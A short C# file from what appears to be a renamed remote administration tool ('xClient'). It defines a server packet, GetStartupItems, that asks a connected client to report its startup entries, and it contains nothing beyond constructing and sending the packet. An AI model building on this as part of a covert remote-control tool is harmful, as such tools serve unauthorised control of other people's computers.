using System;
using xClient.KuuhakuÇekirdek.Ağ;

namespace xClient.KuuhakuÇekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class GetStartupItems : IPacket
    {
        public GetStartupItems()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}